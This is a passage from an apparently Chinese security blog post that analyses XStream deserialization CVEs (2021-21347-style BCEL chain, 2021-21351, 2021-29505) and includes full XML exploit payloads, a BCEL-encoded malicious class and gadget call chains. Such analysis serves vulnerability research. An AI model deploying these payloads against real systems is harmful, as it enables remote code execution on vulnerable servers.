class=&#x27;hashtable&#x27;/&gt;</span><br><span class="line">                  &lt;classes defined-in=&#x27;java.lang.ClassLoader&#x27;/&gt;</span><br><span class="line">                  &lt;defaultDomain&gt;</span><br><span class="line">                    &lt;classloader class=&#x27;com.sun.org.apache.bcel.internal.util.ClassLoader&#x27; reference=&#x27;../..&#x27;/&gt;</span><br><span class="line">                    &lt;principals/&gt;</span><br><span class="line">                    &lt;hasAllPerm&gt;false&lt;/hasAllPerm&gt;</span><br><span class="line">                    &lt;staticPermissions&gt;false&lt;/staticPermissions&gt;</span><br><span class="line">                    &lt;key&gt;</span><br><span class="line">                      &lt;outer-class reference=&#x27;../..&#x27;/&gt;</span><br><span class="line">                    &lt;/key&gt;</span><br><span class="line">                  &lt;/defaultDomain&gt;</span><br><span class="line">                  &lt;packages/&gt;</span><br><span class="line">                  &lt;nativeLibraries/&gt;</span><br><span class="line">                  &lt;assertionLock class=&#x27;com.sun.org.apache.bcel.internal.util.ClassLoader&#x27; reference=&#x27;..&#x27;/&gt;</span><br><span class="line">                  &lt;defaultAssertionStatus&gt;false&lt;/defaultAssertionStatus&gt;</span><br><span class="line">                  &lt;classes/&gt;</span><br><span class="line">                  &lt;ignored__packages&gt;</span><br><span class="line">                    &lt;string&gt;java.&lt;/string&gt;</span><br><span class="line">                    &lt;string&gt;javax.&lt;/string&gt;</span><br><span class="line">                    &lt;string&gt;sun.&lt;/string&gt;</span><br><span class="line">                  &lt;/ignored__packages&gt;</span><br><span class="line">                  &lt;repository class=&#x27;com.sun.org.apache.bcel.internal.util.SyntheticRepository&#x27;&gt;</span><br><span class="line">                    &lt;__path&gt;</span><br><span class="line">                      &lt;paths/&gt;</span><br><span class="line">                      &lt;class__path&gt;.&lt;/class__path&gt;</span><br><span class="line">                    &lt;/__path&gt;</span><br><span class="line">                    &lt;__loadedClasses/&gt;</span><br><span class="line">                  &lt;/repository&gt;</span><br><span class="line">                  &lt;deferTo class=&#x27;sun.misc.Launcher$ExtClassLoader&#x27; reference=&#x27;../parent&#x27;/&gt;</span><br><span class="line">                &lt;/processorCL&gt;</span><br><span class="line">              &lt;/iterator&gt;</span><br><span class="line">              &lt;type&gt;KEYS&lt;/type&gt;</span><br><span class="line">            &lt;/e&gt;</span><br><span class="line">            &lt;in class=&#x27;java.io.ByteArrayInputStream&#x27;&gt;</span><br><span class="line">              &lt;buf&gt;&lt;/buf&gt;</span><br><span class="line">              &lt;pos&gt;0&lt;/pos&gt;</span><br><span class="line">              &lt;mark&gt;0&lt;/mark&gt;</span><br><span class="line">              &lt;count&gt;0&lt;/count&gt;</span><br><span class="line">            &lt;/in&gt;</span><br><span class="line">          &lt;/is&gt;</span><br><span class="line">          &lt;consumed&gt;false&lt;/consumed&gt;</span><br><span class="line">        &lt;/dataSource&gt;</span><br><span class="line">        &lt;transferFlavors/&gt;</span><br><span class="line">      &lt;/dataHandler&gt;</span><br><span class="line">      &lt;dataLen&gt;0&lt;/dataLen&gt;</span><br><span class="line">    &lt;/com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&gt;</span><br><span class="line">    &lt;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data reference=&#x27;../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;/&gt;</span><br><span class="line">  &lt;/java.util.PriorityQueue&gt;</span><br><span class="line">&lt;/java.util.PriorityQueue&gt;</span><br></pre></td></tr></table></figure>

<p>链与CVE-2021-21347的原理相同，只不过使用的类加载器不同，这里使用的BCEL类加载器，如果是Windows用户则string标签的内容替换成下面：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dW$JxTW$V$fe_f$b93$_$P$I$T$C$MK$81$ca$92$40$92$b1$40S$98$ABB$80$40$W$q$y$NK$ed$cb$e4$91$3c$98$ccLg$de$Aim$d5$da$cd$aaU$eb$8aV$d4$da$g$8b$ad$W$y$D$96BZ$XD$5c$8a$d2$ba$U$f7$7d$ab$3b$8a$e2W$fc$ef$9b$r$93$c9$80M$be$b9$f7$dds$ce$3d$e7$3f$e7$9es$cf$7bg$5ey$fa$q$80$85$f8$af$8a$w$dc$xp$9f$8a$S$dc$eb$c1$db$e4$7c$bf$X$a3$f1v$f9$f4$O$P$de$v$X$P$c8$c5$bb$3cx$b7$5c$bcG$$$k$Ux$af$H$efS1$L$efW$f1$B$7cP$O$l$S$d8$af$a2$5c$w$fc$b0$8a$K$7cD$O$P$c9$e1$a3r8$my$l$T$f8$b8$8a$c9$f8$84$5c$i$QxX$c55r$c3$t$a5$aaG$e4$f0$a8$H$9fR1$80O$L$3c$spP$92$3e$a3$e2q$3c$n$f0Y9$7f$ce$83$5d$5e$3c$89C$92sX$c5$e7$f1$84$ca$e5S$f2$e9$88$d4$f6$a0$H$v$_$8e$e2$98$8a$_$e0i$V$d3q$5c$c538$e1$c1I9$P$K$3c$x$f0$9c$8a$m$be$a8$c0$Z$d1$fb$M$F$be$96$5d$fa$k$3d$Q$d6$p$3d$81$O$xnFz$ea$V8$f4$k$b2$94f$F$rf$b7$C$f7$S3bZ$cbH$af$ac$da$cc$9d$8d$d1n$b2$c7$b4$98$R$a3$z$d9$d7e$c47$ea$5da$5bW4$a4$877$ebqS$ae3D$a7$d5k$s$Ux$5b$3a$acd$b7$R$b1$a8$decE$d3$a6$U$8c$ab$ac$w$G$40$f4$YV$9b$8dO$q$b2O$V$95$p$r$r$i7eWH$bcDG$c4$eeDf$e9$acl$96l$X$d9$cdt$c2$95H$cf$ce$3e$dd$8c$u$Y_$b9$ad$b8$3aGO$94p$a7$a7$99I$cb$M$Hn5c$81$d5$5b$9b$d7$b7$t$adX$d2$a2$a8$a1$f7$R$a3$b3K$97$92$d3$d2$92f4$d0$d0o$Z$x$e2q$bd$bf$40$b04$U$8d$q$acx2dE$e39y$dbl$dc$d8$Z6BV$a0qH$80$f2$a3$ba$8dPX$8f$h$dd$8da$3dA$Lc$f3v$d8$a4zy$$$f4A$e9$e2$af$81H$f4x$P$e5$ca$8bxD$ebf$q$H$86A$cc$a1m$8e$e4ctu$R$3cu$94l$a3$3eGH$df$ab$c0$9f$Tm$ec$d5$e3$b6c$5b$e2$a6eH$88$r$bb$f6$OO$9d$f6$ae$5dtD$w$da$xe$UL$w$e2f$aba$f5F$bbe$e8Bv$G9$bbBF$98G1$3cm$fac$d9$d4$ZW$e8$f8$92$b9$cbd$7c$3a$y$3d$b4$bbU$8f$d9b$C$ba$c0$97$E$f8$b0$9f$r$c6$Kdm$b1b$E$be$y$f0$V$Fj$d3$be$90$R$b3L$86X$e0$94$c0W$FN$L$7cM$e0$M$TqI$u$9cIm$c5$Y$W$9c$f6$dc$aezV$N$b5tD$93$f1$90$b1$ca$94$b8$b4L$w$d7Jq$N$x$c0$98M$u$M$7dC$d2$Mw$h$3c$f0$d1$Z$e9$dbd$c1$z$9d$a3$e1$eb$f8$86$86$rX$w$9f$be$c9$84$ad$9e$cer$e3j$Z$5e$tI$df$b2If$b7$U$5d$$$a5$d6$80i$z2Zl$f7$d3$d6C2$q$g$9e$c7Y$G$40$c3$b7$d1$a6$e1$3b8$a7$60$eaU3R$c15W$cfm$e9$d1$L$gv$e1E$N$dfE$83$86$ef$c9$e1$fb$f8$BSl$c8$cb$8d$bd$f1$e8$5ey$A$g$5e$c2$f9l$AFf$8b$82$f9$a1h_$m$91$8c$E$a2$f1$9e$80$k$d3C$bdF$40$9e$7c$c0$8c$90$l$d1$c3$B$db$93$9d$8cm$60$TA$99V$bf$86$l$e2G$g$d6J$cf$97r$7b$z$b7$d7r$7bmz$7b$ad$dc$5e$9b$dd$5e$9b$db$5e$9b$d9$3es$z$b1$a4$cd$L$fcX$c3O$f0S$deW$F$c9$c4$93$c9BN$8bj$f8$Z$7e$$$f0$L$N$bf$c4$af$U$94$Vf$b7$86_$e37$C$bf$d5$f0$3bl$d7$f0$7b$fc$819$a6$e1$8fxY$c3$9f$f0g$a6$d3$cc$99$N$8dM$z3g$K$fcE$c3_$f17$81$bfk$f8$HZ4$5c$c0$3f$F$fe$a5$e1$o$feM9$a6$7b$a8$d6$d8$c7$d0$fd$H$97$b2Q$j$9ev$ac$a0$n$fb$h$92$R$cb$ec3rLyB$e7$f3$f7$e5$97$f8$c4$x$V$k$xv$5b$91$abd$da$Q$a9$z$da$91$M$f5$a6$a5$f3$90L$l$92h$e6E$a5$T$8c$$9W$Q$J$87$8d$k$3d$bc$o$U2$S$89$3c$91y$pq5G$f6$b0$f4$r$7b$p$af0$c3$w$ae$d0$G$da$W$b5VE$93$91$7cXn$3d$W3$ot$ab$a6Xg$YA$ca$U$q$3d$9eR$d9xuv$f3$d5$d8$e5$E$ba$c1H$d8$f7$c1$8aD6$eaUW$c60$e2$b2$f5$92j$863$ed$914$d9$9d$w$b75$c8$ee$e5$af$cc$ed$Z$d6Edg$S$94iN$f7$b4$9d$e1d$a2$97s$u$iMPI$a9$V$cd$95$bal$7cU$f2$W$l$a5www$qc$b18$8f$c1$a0$89$89$f9$Is$d5kk$f6$d1$a5$95$f9MG$b6$C$b6$e6b$e9RV$e8$s$P$c2$b8$r$a9$87$T$F$z$3a$d3$S$aa$b6$f2$86$cf$d7$9f$df$M$XT$8e4Q$f5$7f$h$e4$d4$ab$K$d0s$f9$K$60$a7$9f$99$8eq$e5V$e9ei$c4$d8$9b$ce$df$Q$89s$86$99$ce$82$z$d6$d2$c6$e6$a7$bfe$f4$c8$3b$cd$b9$b1s$7d$TYy$8ee$8bly$91Lxu$5e$e6$fa$a3$d8$a3$87$93F$fbN$f9$9a2$y$X3$f6$v$e26Y$3b$bb$e9$c7$e2$o1$7f$b5$9e$e5$9fe$7f$c22$98$c7$8eh$d2$ca$ef$84$eb$89$7f$us$cb$8b$90$J7$sWaY$92$7cu$b1$5b$fb$84$oA$d8j$a7e$5e43$d7$g$bb$ab$y$a9$ec$a2b$d8$xa$86$y_$gxa$86$e4$b9$5d$bd$d8$d7$c7$a3$f2$e4$eb1$83$af$ecU$7c$d9w$f0$ad$9d$dd$96O$r$b2$c5$da$f3r$7b$adB$91$cd$9bc$pW$B$ce$Kg$d7$dc$a3P$O$d9b$x9$bam$a2$86$s$7b$b4$F$b0$K$ab9$x$b23g6$f7RZ$f2$96$jGI$e7Q8$7c$ce$U$V$3d$F7$a7$b29$v$I$9f$tM$f0$a6$a0$faJ$d3$cfZ$96Yv$3b$87$UF$3dY$60uR$9e$d5e9$abksV$87$m$d3R$e1$e6k$8bB$5e$87$96$cc$e6e$94$$$91$d2s$e7$j$81$7b$c8a$d5$a6$ce$e6$9e9$b6$86$f1i$a9$8c$G$f9$q$a3$v$N$b7$a2$ad$I$Q$ef$e3$F$40$e6$W$F$d2$8e$f5$p$80L$3e$Co$n$90Z$ee$J$5c$B$88$3cNi$f8$f5E$p$a2$VFd$7eQ$m$h$8aGD$x$ER$c7$3d7$5c$B$c8r$3b$o$5et$60$py$d4$e5$5cD$aaF$f5g$7d$a3$7dcR$uk$99$97$c2$d8g$3c$ad$f3$aaS$f0m9$8erf$c9$b86$r$e8$3c$8e$8a$ce$9a$a3$Y$lt$vA$b7$dfU$ed$a8$3e$99$c2$E$bf$x$85$89r$f0$d7$a40$a9$d5$ef$3a$85M$7e$f7$a94$c3$3f$805A$e1w$fb$993S$G$b0$qC$5bH$9a$a0$O1$Y$f4$c8$N3$f27$8c$Lz$b9$c1ko$f0$d84$bfg$b0$e6$U$d6$fb$9d$a70$9eF$a6$O$60e$d0$e5wJ$ke$W$a5I$d7$91$e4$K$928$YT$v$3d$zO$ba$3cXJ$e9R$5bZH$92_$j$3c$8ek$e8$d74$e9$97$St$f9$a6$a70$83$80$dc$t$eb$84$a3$ceS$e1$a9$Q$PK7$w$3c$f3$89$86X$ae$f5$bd$s$85$99$fbQ$ef$f7$3aO$60V$a7$c37$bb$p$859A$d5$af$b2$7e$w9$9e$40U$a7$a3$86$c4$b9$E$e1$f5$cdK$8b$jF5I5A$d7$5d$ke$e0$f2A$bf$8b$d2$b5$d5$85$96$aa$a5$a5$Fu$de$K$efX$5c$be$a3N$f5$d3$bb$b4$c2$K$f5$Y$C$d4$f0$da$z$b6$82sD$7f$5d$d0$9d$z$dd$f9$yK$bf$y$5cVdP$i$c6$C$Z$e7$85$7e$b7$f3$Y$ae$dfr$88$d9$d0$ceS$de$c2O$f9$gf$c3$ee$ccl1$P$de$8c$bbq$l$d7$bb$b1$c7$5e$3f$8a$c7$f8$d9$3e$99$df$e1$Pa03$9f$s$fd$i$df$a8_$e2z$Qg$ec$b5$d3$ce$b2$7bxc$81$df$e6$k$d4c$Mk$ac$82$f9X$c3$E$afcv$d5$f3$9eZ$ce$9b$aa$89$b9$b5$9bt$8b$f3$m$e7$d3$9c_$s$f5$Cs$f1$o$b3$f1$S$d6$u$T$f9$d2$3c$Lk$95$eb$b1N$a9G$8b$b2$W$ad$ca$O$d2C$e8PL$dc$a8$dc$89N$e5$7elU$O$f0$f9$RlW$Ob$87$f2$ynRN$e3f$e5y$e8v$86$3f$c0$bbs$$$e2$d8$84$cd$cc$fa$a98K$7fo$84$83$3a$x$d1$89$adPi$a5$J$db$b0$j$5e$ea$g$87$j$c4$a9R$f3$U$dc$847$b0$O$98$f7$b8$99$ba$A$P$f5v$n$c4$ea$Y$a3$3c$87n$Y$ac$8f$L8$8f$9d$e8$e1$cd$7c$91$9f$V$bd0$Z$81Kx$91_$i$bb$e1$o$9e$d9$I$b3$9e$dcDU$86$3e$3e$JD$d2u$9b$b1$g$a5$85$Y$v$_$a0$e22$81$J$81$5b$E$f8$a6$cf$P$3cK$m$v$b0$87$p$U$O$a5$ab9$ac$e1$ef2$ca$e1$z$$$97$93u$5e$s6W$81$Q$d0$$y$abrz$c6$a2t$84$I$ffrZ$iR$8b$p$t$C$5cfT$f2M$ef$V$d8$t$d0$_p$ab$c2$8b$e8$S6$5c$84$eb$V$94$91$a7$u$Xy$81$ddFm$a3y$7b$y$c6$hq$3b$ee$c0$9b$98W$k$bc$r$d7$a7v2n$f2$G$9bp$Mu$be$hRX$b4e$A$a3$d6$jG$b0$93$8d$ab$7e$f0$90$cd$f42$5c$8b$v$b8$d2$be$ae$5c$i$7d$a4U$90Z$8eQ$3c$b0$f1$fc$cf$5e$86$a3$c8$b9$To$e5$wf$3bR$d2$op$97$97$8c$bb$ed$h$f0$9e$ff$B$fc$9cQ$3b5$T$A$A</span><br></pre></td></tr></table></figure>

<p>BCEL有个特性，会检测类名是否包含$$BCEL$$这个前缀，若包含该前缀，则去掉该前缀，然后将后面的内容解码成字节数组，然后将字节数组转换成类：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304111646165.png" alt="image-20230411164621051"></p>
<p>我复现半天没复现成功，一开始是因为BCEL 类加载器在jdk8u251删除了，而我使用的jdk8u361没有该类加载器导致找不到该类加载器，后面通过导入各种含有BCEL 类加载器的库，也同样没复现成功。比如我导入该库：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.bcel&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;bcel&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;6.4.1&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>发现在createClass方法中会调用setBytes方法抛异常，无论怎么改，最终都无法return创建好的java类：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304111640915.png" alt="image-20230411164044779"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304111642483.png" alt="image-20230411164225417"></p>
<p>触发类加载器加载类在JavacProcessingEnvironment的hasNext方法，在hasNext方法中加载类然后实例化：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304111643222.png" alt="image-20230411164333135"></p>
<p>整个利用链如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">org.apache.bcel.util.ClassLoader.createClass</span><br><span class="line">org.apache.bcel.util.ClassLoader.loadClass</span><br><span class="line">java.lang.ClassLoader.loadClass</span><br><span class="line">com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator.hasNext</span><br><span class="line">javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator.hasMoreElements</span><br><span class="line">java.io.SequenceInputStream.nextStream</span><br><span class="line">java.io.SequenceInputStream.read</span><br><span class="line">com.sun.xml.internal.bind.v2.util.ByteArrayOutputStreamEx.readFrom</span><br><span class="line">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data.get</span><br><span class="line">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data.toString</span><br><span class="line">javafx.collections.ObservableList$1.compare</span><br><span class="line">java.util.PriorityQueue.siftDownUsingComparator</span><br><span class="line">java.util.PriorityQueue.siftDown</span><br><span class="line">java.util.PriorityQueue.heapify</span><br><span class="line">java.util.PriorityQueue.readObject</span><br></pre></td></tr></table></figure>

<p>使用老版本jdk（jdk&lt;8u251）能复现成功，最后成功实例化恶意类。</p>
<h2 id="CVE-2021-21351"><a href="#CVE-2021-21351" class="headerlink" title="CVE-2021-21351"></a>CVE-2021-21351</h2><h3 id="分析-16"><a href="#分析-16" class="headerlink" title="分析"></a>分析</h3><p>该漏洞造成JNDI注入，</p>
<p>简化后的POC如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;sorted-set&gt;</span><br><span class="line">  &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">    &lt;type&gt;ysomap&lt;/type&gt;</span><br><span class="line">    &lt;value class=&#x27;com.sun.org.apache.xpath.internal.objects.XRTreeFrag&#x27;&gt;</span><br><span class="line">      &lt;m__DTMXRTreeFrag&gt;</span><br><span class="line">        &lt;m__dtm class=&#x27;com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM&#x27;&gt;</span><br><span class="line">          &lt;m__size&gt;-10086&lt;/m__size&gt;</span><br><span class="line">          &lt;m__mgrDefault&gt;</span><br><span class="line">            &lt;m__dtms&gt;</span><br><span class="line">              &lt;null/&gt;</span><br><span class="line">            &lt;/m__dtms&gt;</span><br><span class="line">          &lt;/m__mgrDefault&gt;</span><br><span class="line">          &lt;m__incrementalSAXSource class=&#x27;com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces&#x27;&gt;</span><br><span class="line">            &lt;fPullParserConfig class=&#x27;com.sun.rowset.JdbcRowSetImpl&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">              &lt;javax.sql.rowset.BaseRowSet&gt;</span><br><span class="line">                &lt;default&gt;</span><br><span class="line">                  &lt;dataSource&gt;rmi://localhost:1097/Object&lt;/dataSource&gt;</span><br><span class="line">                &lt;/default&gt;</span><br><span class="line">              &lt;/javax.sql.rowset.BaseRowSet&gt;</span><br><span class="line">            &lt;/fPullParserConfig&gt;</span><br><span class="line">            &lt;fConfigSetInput&gt;</span><br><span class="line">              &lt;class&gt;com.sun.rowset.JdbcRowSetImpl&lt;/class&gt;</span><br><span class="line">              &lt;name&gt;setAutoCommit&lt;/name&gt;</span><br><span class="line">              &lt;parameter-types&gt;</span><br><span class="line">                &lt;class&gt;boolean&lt;/class&gt;</span><br><span class="line">              &lt;/parameter-types&gt;</span><br><span class="line">            &lt;/fConfigSetInput&gt;</span><br><span class="line">            &lt;fConfigParse reference=&#x27;../fConfigSetInput&#x27;/&gt;</span><br><span class="line">          &lt;/m__incrementalSAXSource&gt;</span><br><span class="line">        &lt;/m__dtm&gt;</span><br><span class="line">      &lt;/m__DTMXRTreeFrag&gt;</span><br><span class="line">    &lt;/value&gt;</span><br><span class="line">  &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">  &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">    &lt;type&gt;ysomap&lt;/type&gt;</span><br><span class="line">    &lt;value class=&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27;&gt;</span><br><span class="line">      &lt;m__obj class=&#x27;string&#x27;&gt;test&lt;/m__obj&gt;</span><br><span class="line">    &lt;/value&gt;</span><br><span class="line">  &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">&lt;/sorted-set&gt;</span><br></pre></td></tr></table></figure>

<p>前半部分和21346相同，差别是在XString.equal方法中执行了不同对象的toString而造成利用链后续的不同。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304111739150.png" alt="image-20230411173948037"></p>
<p>这里进入的是XRTreeFrag的父类XObject的toString方法，在该方法中又调用str方法回到XRTreeFrag：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304111740697.png" alt="image-20230411174017632"></p>
<p>在str方法中，调用<code>m__DTMXRTreeFrag</code>属性的<code>m__dtm</code>属性（SAX2DTM）的getStringValue方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304111742289.png" alt="image-20230411174209221"></p>
<p>在getStringValue方法中进入<code>_firstch</code>方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304111752379.png" alt="image-20230411175239308"></p>
<p>在<code>_firstch</code>方法中调用nextNode方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304111753983.png" alt="image-20230411175333876"></p>
<p>在nextNode方法又调用<code>m_incrementalSAXSource</code>属性的deliverMoreNodes：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304111755617.png" alt="image-20230411175536519"></p>
<p>接着调用parseSome方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304111756562.png" alt="image-20230411175647493"></p>
<p>反射调用setAutoCommit方法，传递false，后面就是熟悉的利用链了：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304111758913.png" alt="image-20230411175819798"></p>
<p>调用connect方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304111759977.png" alt="image-20230411175920887"></p>
<p>connect方法中，造成JNDI注入：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304111800567.png" alt="image-20230411180043460"></p>
<h2 id="分割线-1"><a href="#分割线-1" class="headerlink" title="分割线"></a>分割线</h2><p>终于分析完了1.4.15的11个漏洞，血汗。中间有些利用链是自动化工具发掘的，要控制这条利用链从source走到sink，要考虑到的东西太多了，但是其实说白了就一点，也就是某些属性赋不赋值的问题，在到达最终的sink点前，中间会有一些打断利用链执行的关键属性，而缺少这些关键属性，有一些可能会好一点的提示出现空指针引用异常（指示哪个属性空指针引用了），而有一些则是其他类型的错误，这种其他类型的错误很难找到是因为哪个属性为null出现的问题，全部都赋值的话那样又会花费大量心血，因为属性有些是复杂的类，其中的结构难以想象。</p>
<h2 id="CVE-2021-29505"><a href="#CVE-2021-29505" class="headerlink" title="CVE-2021-29505"></a>CVE-2021-29505</h2><h3 id="适用范围-6"><a href="#适用范围-6" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li>XStream &lt;&#x3D; 1.4.16</li>
</ul>
<h3 id="分析-17"><a href="#分析-17" class="headerlink" title="分析"></a>分析</h3><p>这个漏洞会使用底层JRMP向指定的JRMP服务端发起一个连接，而我们可以伪造一个服务端，向客户端返回一个恶意对象，客户端收到这个恶意对象后反序列化造成命令执行。</p>
<p>由于我的jdk版本太高了，复现不了该漏洞，官方给的POC也是直接运行不了的，这里从其他blog找到了POC：Packet</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">&lt;java.util.PriorityQueue serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">    &lt;unserializable-parents/&gt;</span><br><span class="line">    &lt;java.util.PriorityQueue&gt;</span><br><span class="line">        &lt;default&gt;</span><br><span class="line">            &lt;size&gt;2&lt;/size&gt;</span><br><span class="line">        &lt;/default&gt;</span><br><span class="line">        &lt;int&gt;3&lt;/int&gt;</span><br><span class="line">        &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">            &lt;type&gt;12345&lt;/type&gt;</span><br><span class="line">            &lt;value class=&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27;&gt;</span><br><span class="line">                &lt;m__obj class=&#x27;string&#x27;&gt;com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content: none&lt;/m__obj&gt;</span><br><span class="line">            &lt;/value&gt;</span><br><span class="line">        &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">        &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">            &lt;type&gt;12345&lt;/type&gt;</span><br><span class="line">            &lt;value class=&#x27;com.sun.xml.internal.ws.api.message.Packet&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                &lt;message class=&#x27;com.sun.xml.internal.ws.message.saaj.SAAJMessage&#x27;&gt;</span><br><span class="line">                    &lt;parsedMessage&gt;true&lt;/parsedMessage&gt;</span><br><span class="line">                    &lt;soapVersion&gt;SOAP_11&lt;/soapVersion&gt;</span><br><span class="line">                    &lt;bodyParts/&gt;</span><br><span class="line">                    &lt;sm class=&#x27;com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl&#x27;&gt;</span><br><span class="line">                        &lt;attachmentsInitialized&gt;false&lt;/attachmentsInitialized&gt;</span><br><span class="line">                        &lt;multiPart class=&#x27;com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart&#x27;&gt;</span><br><span class="line">                            &lt;soapPart/&gt;</span><br><span class="line">                            &lt;mm&gt;</span><br><span class="line">                                &lt;it class=&#x27;com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator&#x27;&gt;</span><br><span class="line">                                    &lt;aliases class=&#x27;com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl&#x27;&gt;</span><br><span class="line">                                        &lt;candidates class=&#x27;com.sun.jndi.rmi.registry.BindingEnumeration&#x27;&gt;</span><br><span class="line">                                            &lt;names&gt;</span><br><span class="line">                                                &lt;string&gt;aa&lt;/string&gt;</span><br><span class="line">                                                &lt;string&gt;aa&lt;/string&gt;</span><br><span class="line">                                            &lt;/names&gt;</span><br><span class="line">                                            &lt;ctx&gt;</span><br><span class="line">                                                &lt;environment/&gt;</span><br><span class="line">                                                &lt;registry class=&#x27;sun.rmi.registry.RegistryImpl_Stub&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                                                    &lt;java.rmi.server.RemoteObject&gt;</span><br><span class="line">                                                        &lt;string&gt;UnicastRef&lt;/string&gt;</span><br><span class="line">                                                        &lt;string&gt;127.0.0.1&lt;/string&gt;</span><br><span class="line">                                                        &lt;int&gt;2333&lt;/int&gt;</span><br><span class="line">                                                        